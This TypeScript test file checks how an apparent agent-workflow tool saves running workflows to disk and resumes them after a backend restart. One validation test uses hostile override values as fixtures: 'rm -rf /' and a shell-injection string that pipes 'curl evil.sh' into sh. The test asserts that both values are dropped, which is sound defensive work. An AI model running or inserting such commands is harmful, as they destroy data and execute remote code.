import { test } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import { canonicalProjectPath } from '../projectPath.js';
import {
  completeWorkflowStep,
  failWorkflowRun,
  restoreWorkflowRun,
} from '../workflowRuns.js';
import { notify, runs, type WorkflowRun } from '../workflowRuns/state.js';
import {
  deserializeWorkflowRuns,
  flushWorkflowRunPersist,
  loadPersistedWorkflowRuns,
  serializeWorkflowRuns,
  workflowRunsFile,
  writeWorkflowRunsNow,
} from '../workflowRuns/persistence.js';
import {
  classifyWorkflowRunResume,
  findStepSessionId,
} from '../workflowRuns/resumeDecision.js';
import { workflowStepDir } from '../workflowRuns/scratchDirectory.js';
import { createWorkflow } from '../workflows.js';

// Regression for: "I ran a workflow, steps 1-4 ran, step 4 was in progress —
// then the workflow status vanished from the navbar and the run stopped."
//
// Root cause: a workflow run lived ONLY in the in-memory `runs` map. The
// backend process is restarted routinely (tsc -w + the dev runner on any
// backend/src change, a crash, a processGuards fail-fast), and `dev.mjs` only
// defers a restart while a per-project run.lock is held — which a workflow
// holds during CONTROL steps and NOT during agent steps. A restart mid-agent-
// step therefore erased the run: /api/workflow-runs/active went empty (the
// vanished chip), and the step's agent — whose pty lives in the DETACHED
// terminal-server and survives the restart — later POSTed /complete into a
// backend that had never heard of the run, where completeWorkflowStep returned
// silently. Every remaining step (Start all open tasks / Merge / Push) never
// ran, with no error surfaced anywhere.
//
// The fix mirrors every running run to
// ~/.lattice/per-project/<hash>/workflow-runs.json and re-adopts it on boot.

function fakeRun(overrides: Partial<WorkflowRun> = {}): WorkflowRun {
  return {
    id: 'wfrun_resume_1',
    workflowId: 'wf-resume',
    workflowName: 'Refactor',
    projectPath: canonicalProjectPath('C:/resume-project'),
    status: 'running',
    startedAt: 1_700_000_000_000,
    totalSteps: 7,
    currentStepIndex: 3,
    ...overrides,
  };
}

// ---------------------------------------------------------------------------
// The decision policy
// ---------------------------------------------------------------------------

test('classifyWorkflowRunResume: an agent step whose pty survived is re-adopted', () => {
  const d = classifyWorkflowRunResume({
    status: 'running',
    currentStepIndex: 3,
    definitionStepCount: 7,
    stepKind: 'agent',
    stepSessionAlive: true,
  });
  assert.equal(d.action, 'readopt');
});

test('classifyWorkflowRunResume: an unprobeable terminal-server re-adopts, never errors', () => {
  // `null` means "couldn't ask" — NOT "no sessions". Treating it as gone would
  // let one transient probe failure mass-error every healthy run on the box.
  const d = classifyWorkflowRunResume({
    status: 'running',
    currentStepIndex: 3,
    definitionStepCount: 7,
    stepKind: 'agent',
    stepSessionAlive: null,
  });
  assert.equal(d.action, 'readopt');
});

test('classifyWorkflowRunResume: a pending agent step (no terminal ever requested) is redispatched even when the probe fails', () => {
  // A step still inside its pre-run tool (an Opengrep scan) is checkpointed
  // `pending`; nothing exists to re-adopt, and a `null` probe used to park it
  // in readopt with no `/complete` ever coming.
  for (const alive of [null, false] as const) {
    const d = classifyWorkflowRunResume({
      status: 'running',
      currentStepIndex: 1,
      definitionStepCount: 2,
      stepKind: 'agent',
      stepPhase: 'pending',
      stepSessionAlive: alive,
    });
    assert.equal(d.action, 'redispatch', `alive=${String(alive)}`);
  }
  const live = classifyWorkflowRunResume({
    status: 'running',
    currentStepIndex: 1,
    definitionStepCount: 2,
    stepKind: 'agent',
    stepPhase: 'pending',
    stepSessionAlive: true,
  });
  assert.equal(live.action, 'readopt', 'a positively-alive session is still re-adopted');
});

test('classifyWorkflowRunResume: an agent step whose pty is gone errors instead of hanging', () => {
  const d = classifyWorkflowRunResume({
    status: 'running',
    currentStepIndex: 3,
    definitionStepCount: 7,
    stepKind: 'agent',
    stepSessionAlive: false,
  });
  assert.equal(d.action, 'error');
  assert.match(d.reason, /completion callback can never arrive/);
});

test('classifyWorkflowRunResume: control steps are re-run (they die with the process)', () => {
  for (const kind of ['start', 'merge', 'push'] as const) {
    const d = classifyWorkflowRunResume({
      status: 'running',
      currentStepIndex: 4,
      definitionStepCount: 7,
      stepKind: kind,
      // Control steps never have a pty; the probe result is irrelevant.
      stepSessionAlive: false,
    });
    assert.equal(d.action, 'redispatch', `${kind} must be re-runnable`);
  }
});

test('classifyWorkflowRunResume: a finished run is skipped, a vanished/shrunk definition errors', () => {
  assert.equal(
    classifyWorkflowRunResume({
      status: 'completed',
      currentStepIndex: 6,
      definitionStepCount: 7,
      stepKind: 'agent',
      stepSessionAlive: true,
    }).action,
    'skip',
  );
  assert.equal(
    classifyWorkflowRunResume({
      status: 'running',
      currentStepIndex: 3,
      definitionStepCount: null, // workflow deleted while the run was interrupted
      stepKind: null,
      stepSessionAlive: true,
    }).action,
    'error',
  );
  assert.equal(
    classifyWorkflowRunResume({
      status: 'running',
      currentStepIndex: 9, // the user edited the workflow down to 3 steps
      definitionStepCount: 3,
      stepKind: null,
      stepSessionAlive: true,
    }).action,
    'error',
  );
});

// ---------------------------------------------------------------------------
// Finding the surviving pty
// ---------------------------------------------------------------------------

test('findStepSessionId matches a live pty by its step-dir cwd and ignores junk entries', () => {
  const stepDir = workflowStepDir('C:/resume-project', 'wfrun_x', 3);
  const sessions = [
    null,
    { id: 'tty_other', cwd: 'C:/resume-project' },
    { id: 42, cwd: stepDir }, // non-string id → not usable
    { cwd: stepDir }, // no id
    { id: 'tty_step3', cwd: stepDir },
  ];
  assert.equal(findStepSessionId(sessions as never[], stepDir), 'tty_step3');
  assert.equal(
    findStepSessionId(sessions as never[], workflowStepDir('C:/resume-project', 'wfrun_x', 4)),
    null,
    'a different step index must not match',
  );
  assert.equal(findStepSessionId([], stepDir), null);
});

test('findStepSessionId tolerates separator/case drift in the reported cwd', () => {
  const stepDir = workflowStepDir('C:/resume-project', 'wfrun_x', 2);
  const drifted =
    process.platform === 'win32'
      ? stepDir.replace(/\\/g, '/').toLowerCase()
      : stepDir.replace(/\/+/g, '//');
  assert.equal(findStepSessionId([{ id: 'tty_a', cwd: drifted }], stepDir), 'tty_a');
});

// ---------------------------------------------------------------------------
// The on-disk mirror
// ---------------------------------------------------------------------------

test('workflow-run (de)serialization round-trips and drops unresumable records', () => {
  const run = fakeRun({ harnessOverride: 'pi', piModelOverride: 'openai/gpt-x' });
  const parsed = deserializeWorkflowRuns(JSON.parse(serializeWorkflowRuns([run])));
  assert.deepEqual(parsed, [run]);

  // Only `running` runs are resumable — a finished one has nothing to resume.
  assert.deepEqual(
    deserializeWorkflowRuns({ version: 1, runs: [fakeRun({ status: 'completed' })] }),
    [],
  );
  // Structurally broken records are dropped individually, not fatally.
  assert.deepEqual(
    deserializeWorkflowRuns({
      version: 1,
      runs: [null, 'nope', { id: 'x' }, { ...run, currentStepIndex: -1 }, run],
    }).map((r) => r.id),
    [run.id],
  );
  assert.deepEqual(deserializeWorkflowRuns(undefined), []);
});

test('persisted overrides are re-validated on the way back in (they reach a spawn command)', () => {
  // The mirror is a file on disk: stale, hand-editable, corruptible. Both
  // override fields end up in a harness command, so a bad value must be
  // dropped at this boundary rather than trusted from JSON.
  const [parsed] = deserializeWorkflowRuns({
    version: 1,
    runs: [
      {
        ...fakeRun(),
        harnessOverride: 'rm -rf /',
        piModelOverride: 'openai/gpt-x"; curl evil.sh | sh; #',
      },
    ],
  });
  assert.ok(parsed);
  assert.equal(parsed.harnessOverride, undefined, 'a non-harness value is dropped');
  assert.equal(parsed.piModelOverride, undefined, 'a shell-injecting model is dropped');
});

test('the mirror survives a write/read cycle, clears when nothing runs, and never throws on corruption', async () => {
  const project = await fs.mkdtemp(path.join(os.tmpdir(), 'lattice-wfpersist-'));
  try {
    const run = fakeRun({ id: 'wfrun_disk', projectPath: canonicalProjectPath(project) });

    assert.deepEqual(await loadPersistedWorkflowRuns(project), [], 'no file yet → no runs');

    await writeWorkflowRunsNow(project, [run]);
    assert.deepEqual(await loadPersistedWorkflowRuns(project), [run]);

    // A corrupt mirror must degrade to "nothing to resume" rather than throw
    // into boot recovery and abort every later startup phase.
    await fs.writeFile(workflowRunsFile(project), '{"version":1,"runs":[', 'utf8');
    assert.deepEqual(await loadPersistedWorkflowRuns(project), []);

    // No running runs → the file is removed, so boot recovery isn't opening an
    // empty husk for every project that ever ran a workflow.
    await writeWorkflowRunsNow(project, [run]);
    await writeWorkflowRunsNow(project, []);
    await assert.rejects(fs.access(workflowRunsFile(project)));
  } finally {
    await fs.rm(project, { recursive: true, force: true });
  }
});

test('a run-carrying WS event mirrors the project\'s running runs to disk', async () => {
  // The persistence hook lives in `notify`, so every lifecycle event a run
  // emits keeps the mirror current — if it regresses, a restart loses the run
  // again even though the file exists.
  const project = await fs.mkdtemp(path.join(os.tmpdir(), 'lattice-wfnotify-'));
  const canonical = canonicalProjectPath(project);
  const run = fakeRun({ id: 'wfrun_notify', projectPath: canonical });
  try {
    runs.set(run.id, run);
    notify({ type: 'progress', run: { ...run } });
    await flushWorkflowRunPersist(canonical);
    assert.deepEqual(
      (await loadPersistedWorkflowRuns(canonical)).map((r) => r.id),
      [run.id],
    );

    // Finishing the run clears it from the mirror — a completed run must not be
    // resurrected as "running" by the next boot.
    run.status = 'completed';
    notify({ type: 'completed', run: { ...run } });
    await flushWorkflowRunPersist(canonical);
    assert.deepEqual(await loadPersistedWorkflowRuns(canonical), []);
  } finally {
    runs.delete(run.id);
    await fs.rm(project, { recursive: true, force: true });
  }
});

test('a slow workflow mirror write cannot resurrect a finished run', async (t) => {
  const project = await fs.mkdtemp(path.join(os.tmpdir(), 'lattice-wfwrite-order-'));
  const file = workflowRunsFile(project);
  const rename = fs.rename;
  let reachedRename!: () => void;
  const atRename = new Promise<void>((resolve) => { reachedRename = resolve; });
  let releaseRename!: () => void;
  const blockedRename = new Promise<void>((resolve) => { releaseRename = resolve; });
  const renameMock = t.mock.method(fs, 'rename', async (...args: Parameters<typeof fs.rename>) => {
    if (String(args[1]) === file) {
      reachedRename();
      await blockedRename;
    }
    return rename(...args);
  });
  let first: Promise<void> | undefined;
  let second: Promise<void> | undefined;
  try {
    first = writeWorkflowRunsNow(project, [fakeRun({ projectPath: canonicalProjectPath(project) })]);
    await atRename;
    second = writeWorkflowRunsNow(project, []);
    // Give the completion-state operation time to overtake the older rename.
    // The fixed implementation queues it behind the first write instead.
    await new Promise((resolve) => setTimeout(resolve, 25));
    releaseRename();
    await Promise.all([first, second]);
    assert.deepEqual(await loadPersistedWorkflowRuns(project), []);
  } finally {
    releaseRename();
    await Promise.all([first, second]);
    renameMock.mock.restore();
    await fs.rm(project, { recursive: true, force: true });
  }
});

test('flushing workflow persistence waits for a write already handed to the filesystem', async (t) => {
  const project = await fs.mkdtemp(path.join(os.tmpdir(), 'lattice-wfflush-order-'));
  const file = workflowRunsFile(project);
  const rename = fs.rename;
  let reachedRename!: () => void;
  const atRename = new Promise<void>((resolve) => { reachedRename = resolve; });
  let releaseRename!: () => void;
  const blockedRename = new Promise<void>((resolve) => { releaseRename = resolve; });
  const renameMock = t.mock.method(fs, 'rename', async (...args: Parameters<typeof fs.rename>) => {
    if (String(args[1]) === file) {
      reachedRename();
      await blockedRename;
    }
    return rename(...args);
  });
  const writing = writeWorkflowRunsNow(project, [fakeRun({ projectPath: canonicalProjectPath(project) })]);
  try {
    await atRename;
    let flushed = false;
    const flushing = flushWorkflowRunPersist(project).then(() => { flushed = true; });
    await new Promise((resolve) => setTimeout(resolve, 10));
    assert.equal(flushed, false, 'flush must not finish while the mirror is uncommitted');
    releaseRename();
    await flushing;
  } finally {
    releaseRename();
    await writing;
    renameMock.mock.restore();
    await writeWorkflowRunsNow(project, []);
    await fs.rm(project, { recursive: true, force: true });
  }
});

// ---------------------------------------------------------------------------
// The headline behavior: a restored run advances again
// ---------------------------------------------------------------------------

test('a step-completion callback for a run this process never knew is a silent no-op', async () => {
  // This is exactly what the stranded workflow hit: the agent finished, its
  // Stop hook POSTed /complete, and the restarted backend had no run to
  // advance. Nothing threw, nothing was logged as an error, and the remaining
  // steps never ran. Encoded here so the no-op stays the *reason* to restore
  // rather than becoming an accepted outcome.
  await completeWorkflowStep('wfrun_never_existed', 3, 'http://127.0.0.1:5184');
  assert.equal(runs.get('wfrun_never_existed'), undefined);
});

test('restoring a persisted run lets its pending completion callback advance the workflow', async () => {
  const project = await fs.mkdtemp(path.join(os.tmpdir(), 'lattice-wfresume-'));
  let canonical = '';
  try {
    const wf = await createWorkflow(project, 'Refactor', [
      { id: 's1', title: 'Refactor', prompt: 'a', mode: 'sequential', harness: 'claude' },
      { id: 's2', title: 'Documentation', prompt: 'b', mode: 'sequential', harness: 'claude' },
    ]);
    canonical = wf.projectPath;

    // A previous backend process mirrored this to disk while step 2 (the last
    // step) was running; that process then died.
    const persisted = fakeRun({
      id: 'wfrun_restored',
      workflowId: wf.id,
      workflowName: wf.name,
      projectPath: wf.projectPath,
      totalSteps: 2,
      currentStepIndex: 1,
    });
    await writeWorkflowRunsNow(wf.projectPath, [persisted]);

    // Fresh process: the run is not in memory, so the pending callback is lost.
    assert.equal(runs.get(persisted.id), undefined);
    await completeWorkflowStep(persisted.id, 1, 'http://127.0.0.1:5184');
    assert.equal(runs.get(persisted.id), undefined, 'no run to advance yet');

    // Boot recovery reads the mirror and re-adopts the run...
    const [fromDisk] = await loadPersistedWorkflowRuns(wf.projectPath);
    assert.ok(fromDisk, 'the interrupted run must survive on disk');
    assert.equal(restoreWorkflowRun(fromDisk), true);
    assert.equal(runs.get(persisted.id)?.status, 'running');
    // ...and restoring is idempotent, so a second recovery pass can't clobber
    // the live run with the stale on-disk snapshot.
    assert.equal(restoreWorkflowRun(fromDisk), false);

    // ...so the still-running agent's Stop hook now advances it. Step 1 is the
    // last step, so the run completes rather than spawning anything.
    await completeWorkflowStep(persisted.id, 1, 'http://127.0.0.1:5184');
    assert.equal(runs.get(persisted.id)?.status, 'completed');

    // And a completed run is dropped from the mirror.
    await flushWorkflowRunPersist(wf.projectPath);
    assert.deepEqual(await loadPersistedWorkflowRuns(wf.projectPath), []);
  } finally {
    for (const [id, r] of [...runs.entries()]) {
      if (r.projectPath === canonical) runs.delete(id);
    }
    await new Promise((r) => setTimeout(r, 200)); // let the workflow store flush
    await fs.rm(project, { recursive: true, force: true });
  }
});

test('failWorkflowRun surfaces an unresumable run instead of leaving it hanging', () => {
  const run = fakeRun({ id: 'wfrun_unresumable' });
  try {
    restoreWorkflowRun(run);
    assert.equal(failWorkflowRun(run.id, 'session did not survive'), true);
    const stored = runs.get(run.id);
    assert.equal(stored?.status, 'errored');
    assert.equal(stored?.error, 'session did not survive');
    assert.ok(stored?.finishedAt);
    // Idempotent: a second recovery pass (or a late callback) can't re-error it.
    assert.equal(failWorkflowRun(run.id, 'again'), false);
    assert.equal(runs.get(run.id)?.error, 'session did not survive');
  } finally {
    runs.delete(run.id);
  }
});

// Regression (self-hosting soak, 2026-09-25): a Claude step's Stop arrived and
// was ACCEPTED (200, `gated: true`) while the quiescence gate waited out its
// settle window — then the backend restarted. The gate is an in-memory timer,
// the hook never retries an answered callback, and the agent sat idle, so the
// step never advanced (a Run tests step until its 60-min timeout, an agent step
// forever). The Stop is now recorded on the run and a re-adopting backend
// re-arms the gate, counting the quiet window from the Stop itself.
test('a Stop the gate was holding when the backend died still advances the re-adopted run', async () => {
  const { recordStopReceived } = await import('../workflowRuns/stopHookGate.js');
  const { registerPersistedWorkflowRuns, resumePersistedRun } = await import('../recovery/workflowRunResume.js');
  const { READOPTED_SETTLE_MS } = await import('../agentQuiescence.js');
  const project = await fs.mkdtemp(path.join(os.tmpdir(), 'lattice-wfstop-'));
  let canonical = '';
  try {
    const wf = await createWorkflow(project, 'Refactor', [
      { id: 's1', title: 'Plan', prompt: 'a', mode: 'sequential', harness: 'claude' },
      { id: 's2', title: 'Review', prompt: 'b', mode: 'sequential', harness: 'claude' },
    ]);
    canonical = wf.projectPath;
    const live = fakeRun({
      id: 'wfrun_stop_held',
      workflowId: wf.id,
      workflowName: wf.name,
      projectPath: wf.projectPath,
      totalSteps: 2,
      currentStepIndex: 1,
      stepPhase: 'running',
    });
    assert.equal(restoreWorkflowRun(live), true);

    // The Stop lands: recorded durably before the hook gets its answer.
    await recordStopReceived(live.id, 1);
    await flushWorkflowRunPersist(wf.projectPath);

    // The backend dies inside the settle window (the in-memory gate with it).
    runs.delete(live.id);
    const [fromDisk] = await loadPersistedWorkflowRuns(wf.projectPath);
    assert.equal(fromDisk?.stopReceived?.stepIndex, 1, 'the held Stop must survive on disk');
    // Pretend the Stop was long enough ago that even the re-adopted window has
    // passed, so the test needn't wait two minutes.
    fromDisk.stopReceived!.at = Date.now() - READOPTED_SETTLE_MS - 5_000;

    // Boot: the step's pty survived in the terminal-server.
    const sessions = [{ id: 'tty_step1', cwd: workflowStepDir(wf.projectPath, live.id, 1) }];
    registerPersistedWorkflowRuns([fromDisk], sessions);
    await resumePersistedRun(fromDisk, sessions, 'http://127.0.0.1:1', true);

    // No second Stop is coming — the re-armed gate alone must finish the step.
    const deadline = Date.now() + 8_000;
    while (runs.get(live.id)?.status === 'running' && Date.now() < deadline) {
      await new Promise((r) => setTimeout(r, 100));
    }
    assert.equal(runs.get(live.id)?.status, 'completed');
  } finally {
    for (const [id, r] of [...runs.entries()]) {
      if (r.projectPath === canonical) runs.delete(id);
    }
    await new Promise((r) => setTimeout(r, 200));
    await fs.rm(project, { recursive: true, force: true });
  }
});

test('markAgentReadopted counts a held Stop\'s quiet window from the Stop, and is idempotent', async () => {
  const q = await import('../agentQuiescence.js');
  const old = Date.now() - q.READOPTED_SETTLE_MS - 1_000;
  q.markAgentReadopted('wf:test-readopt:0', old);
  assert.equal(q.isAgentQuiescent('wf:test-readopt:0', 4_000), true, 'quiet since the Stop, long enough');
  // The resume pass marks again without a time — it must not reset the clock.
  q.markAgentReadopted('wf:test-readopt:0');
  assert.equal(q.isAgentQuiescent('wf:test-readopt:0', 4_000), true);
  // A fresh re-adopt with no held Stop starts the long window now.
  q.markAgentReadopted('wf:test-readopt:1');
  assert.equal(q.isAgentQuiescent('wf:test-readopt:1', 4_000), false);
  q.forgetAgentQuiescence('wf:test-readopt:0');
  q.forgetAgentQuiescence('wf:test-readopt:1');
});
